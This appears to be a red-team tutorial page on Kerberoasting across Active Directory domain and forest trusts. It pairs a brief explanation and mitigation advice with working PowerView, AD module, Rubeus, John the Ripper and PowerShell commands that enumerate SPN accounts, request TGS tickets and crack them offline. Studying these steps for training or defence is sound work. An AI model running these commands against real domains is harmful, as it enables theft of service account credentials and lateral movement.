# 🟢 Kerberoast

Cross Domain Attacks, particularly leveraging the Kerberoasting technique, exploit weaknesses in the Kerberos authentication protocol to gain unauthorized access across domain boundaries.&#x20;

In these attacks, threat actors target Service Principal Names (SPNs) to request Ticket Granting Service (TGS) tickets. These tickets are then cracked offline, revealing service account credentials.&#x20;

By using tools like PowerShell, attackers can request TGS tickets across forest trusts, potentially escalating their privileges and moving laterally within and across domain environments.&#x20;

Kerberoasting underscores the critical need for robust security measures, such as regular password changes for service accounts and monitoring for anomalous authentication requests.

### Cross Domain Attacks and Kerberoasting

Cross Domain Attacks leverage the Kerberos authentication protocol's weaknesses, allowing unauthorized domain boundary traversal. This method primarily focuses on:

* **Identifying SPN accounts:** Service Principal Names (SPNs) are targeted to initiate the attack.
* **Requesting TGS tickets:** For users with forest trust, attackers request Ticket Granting Service (TGS) tickets.
* **Cracking the tickets:** Utilizing tools like John The Ripper (JTR), the retrieved TGS tickets are cracked to discover service account credentials.
* **Leveraging PowerShell for TGS requests:** Attackers exploit PowerShell to request TGS tickets across forest trusts, enabling lateral movements and privilege escalation.

#### Mitigation Strategies

To counteract such threats, several mitigation strategies are advised:

* **Regular password changes for service accounts:** Ensuring service accounts have robust, frequently updated passwords diminishes the success rate of Kerberoasting.
* **Monitoring for anomalous authentication requests:** Implementing surveillance for irregular authentication requests can help in early detection of potential attacks.

Adhering to these strategies significantly reduces the risk associated with Cross Domain Attacks and Kerberoasting, safeguarding your domain's integrity and security.

### Practice

#### Find user accounts used as Service account

It is possible to execute Kerberoast across Forest trusts

{% tabs %}
{% tab title="Powerview" %}
```
Get-NetUser -SPN
Get-NetUser -SPN -Verbose | select displayname,memberof
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```
{% endtab %}

{% tab title="AD Module" %}
```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}
```
{% endtab %}
{% endtabs %}

#### &#x20;Request a TGS

```
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

#### Check for the TGS

```
klist
```

#### Crack the ticket using JTR

```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

#### Request TGS across trust

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```
